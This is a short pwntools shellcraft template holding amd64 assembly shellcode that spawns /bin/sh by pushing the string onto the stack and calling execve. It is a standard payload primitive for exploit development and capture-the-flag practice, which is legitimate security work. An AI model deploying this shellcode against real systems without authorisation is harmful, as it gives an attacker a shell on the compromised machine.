<% from pwnlib.shellcraft import amd64 %>
<%docstring>Execute /bin/sh</%docstring>

    mov rax, 0x68732f2f6e69622f /* '/bin//sh' */

    /*  clear rdx and rsi */
    cdq
    mov rsi, rdx

    /*  push '/bin//sh\\0' */
    push rdx
    push rax

    /*  Call execve("/bin//sh", 0, 0) */
    ${amd64.syscall('SYS_execve', 'rsp', 0, 'rdx')}
